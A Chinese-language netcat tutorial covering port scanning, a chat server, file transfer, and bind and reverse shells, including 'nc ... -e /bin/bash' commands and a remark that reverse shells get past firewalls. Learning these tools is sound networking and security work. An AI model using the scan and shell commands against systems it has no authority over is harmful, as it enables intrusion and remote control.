							netcat
							
	

		
1.简介

	netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，你可以
	
在脚本中以多种方式使用它。使用netcat命令所能完成的事情令人惊讶。
	
	netcat所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就看你的想像力了。你能建
	
立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。


2.端口扫描

	nc  -v -n 172.31.100.7  -z 21-25		#这个命令会打印21到25 所有开放的端口。
	
	可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.
	
	z 参数告诉netcat连接成功后立即关闭连接， 不进行数据交换

	v 参数指使用冗余选项

	n 参数告诉netcat 不要使用DNS反向查询IP地址的域名
	
	
3.Chat Server

	假如你想和你的朋友聊聊，有很多的软件和信息服务可以供你使用。但是，如果你没有这么奢侈的配置，
	
比如你在计算机实验室，所有的对外的连接都是被限制的，你怎样和整天坐在隔壁房间的朋友沟通那？不要

郁闷了，netcat提供了这样一种方法，你只需要创建一个Chat服务器，一个预先确定好的端口，这样子他就

可以联系到你了。

	Server
			nc -lp 1567
			
	-l：使用监听模式，监控传入的资料

	-p:指定监听端口
	
	netcat 命令在1567端口启动了一个tcp服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此
	
shell中展示。

	Client

		    nc 172.31.100.7 1567
	
	不管你在机器B上键入什么都会出现在机器A上。
	
	
3.文件传输

	大部分时间中，我们都在试图通过网络或者其他工具传输文件。有很多种方法，比如FTP,SCP,SMB等等，但是当
	
你只是需要临时或者一次传输文件，真的值得浪费时间来安装配置一个软件到你的机器上嘛。假设，你想要传一个

文件file.txt 从A 到B。A或者B都可以作为服务器或者客户端，以下，让A作为服务器，B为客户端。

	Server
			
			nc -lp 1567 < file.txt
	
	Client
	
			nc  172.31.100.7 1567 > file.txt
	
	这里我们创建了一个服务器在A上并且重定向netcat的输入为文件file.txt，那么当任何成功连接到该端口，
	
netcat会发送file的文件内容。
	
	在客户端我们重定向输出到file.txt，当B连接到A，A发送文件内容，B保存文件内容到file.txt.

	
4.打开一个shell

	我们已经用过远程shell使用telnet和ssh，但是如果这两个命令没有安装并且我们没有权限安装他们，我
	
们也可以使用netcat创建远程shell。

	假设你的netcat支持-e 参数(默认 netcat)
	
	-e 参数后面跟一可执行程序的名称，当一个连接（入或出）被建立时，这个程序被运行。

	Server

			nc -lp 1567 -e /bin/bash

	Client
			
			nc 172.31.100.7 1567

	
	这里我们已经创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash

	

5.反向shell

	反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由
	
客户提供的服务。

	Server

			nc -lp 1567

	在客户端，简单地告诉netcat在连接完成后，执行shell。

	Client

			nc 172.31.100.7 1567 -e /bin/bash

	反向shell经常被用来绕过防火墙的限制，如阻止入站连接。例如，我有一个专用IP地址为172.31.100.7，
	
我使用代理服务器连接到外部网络。如果我想从网络外部访问这台机器如1.2.3.4的shell，那么我会用反向外壳

用于这一目的
